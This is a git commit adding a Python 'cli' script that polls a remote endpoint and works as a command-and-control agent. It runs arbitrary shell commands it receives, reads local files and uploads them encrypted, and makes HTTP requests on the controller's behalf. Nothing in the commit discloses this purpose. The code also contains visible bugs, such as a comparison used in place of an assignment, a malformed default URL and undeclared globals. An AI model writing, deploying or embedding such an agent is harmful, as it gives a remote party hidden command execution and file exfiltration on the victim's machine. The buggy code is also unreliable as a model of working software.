ab2437d4cab9d185bd77e3a62c8aaea2cf99d2f2
Ricardo Zandonai <squall@outlook.com>
2023-07-27 11:16:08 -0300

    First cli version

---
+++ cli_ngc.py
@@ -0,0 +1,94 @@
+import argparse
+import os
+import tempfile
+import time
+import requests
+import platform
+import subprocess
+
+from ecrypt import Ecrypt
+
+def is_valid_http_method(method):
+    valid_methods = ['POST', 'GET', 'PUT', 'DELETE']
+    return method.upper() in valid_methods
+
+## need cript file and retuns
+ec= None
+endpoint_url = None
+cid = None
+def main():
+    if not endpoint_url:
+        endpoint_url == "http//:127.0.0.1:8433"
+    response = requests.get(endpoint_url + "/hello")
+    if response.status_code == 200:
+        resp = response.json()
+        ec= Ecrypt(public_key=resp.get("pubkey"))
+        cid = resp.get("cid")
+        while True:
+            try:
+                response = requests.get(endpoint_url+"/list/{cid}")
+                data = response.json()
+                command = data.get('command')
+                if command:
+                    command_type = data.get('type')
+                    method = data.get('method')
+                    headers = data.get('headers')
+                    body = data.get('body')
+                    id = data.get('id')
+
+                    if command_type.startswith('dl'):
+                        download_file(id, command, method, headers, body)
+                    if command_type.startswith('filedl'):
+                        download_file(id, command)
+                    if command_type == 'cmd':
+                        execute_command(id, command)
+
+            except Exception as e:
+                send_error(endpoint_url, id, f"Error during command execution: {e}")
+            time.sleep(2) 
+
+def execute_command(id, command):
+    try:
+        if platform.system() == 'Windows':
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+        else:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, executable="/bin/bash")
+
+        payload = {'output': ec.encrypt_content(output),"id": id, "cid":cid}
+        response = requests.post(endpoint_url + "/command", json=payload)
+        if response.status_code != 200:
+            send_error( id, "Failed to send the result to the endpoint.")
+    except subprocess.CalledProcessError as e:
+        send_error(id, f"Error during command execution: {e.output}")
+    except Exception as e:
+        send_error( id, f"Error during command execution: {e}")
+
+def send_file( id, file,name):
+    if name == None:
+        name = file.name
+    upload_response = requests.post(endpoint_url + "/upload", data={"id": id, "cid":cid, "name":name }, files={"file": file})
+    if upload_response.status_code != 200:
+        send_error(id, "Failed to send the file.")
+
+def send_error(id, msg):
+    error = requests.post(endpoint_url + "/error", data={"id": id, "cid":cid, "ret":msg})
+
+def download_file( id, file_url, method=None, headers=None, body=None):
+    try:
+        if method != None:
+            response = requests.request(method.lower(),file_url, headers=headers, data=body)
+            if response.status_code == 200:
+                send_file(id,ec.encrypt_file_content(response.content),None)
+        else:
+            if os.path.exists(file_url):
+                with open(file_url, "rb") as file:
+                    send_file( id, ec.encrypt_file(file),file.name)
+    except Exception as e:
+        send_error( id, print("Error performing the HTTP request:", e))
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Script to perform specific tasks based on commands from an endpoint.")
+    parser.add_argument('--endpoint_url', required=True, help='The URL of the endpoint.')
+    args = parser.parse_args()
+    endpoint_url =args.endpoint_url
+    main()
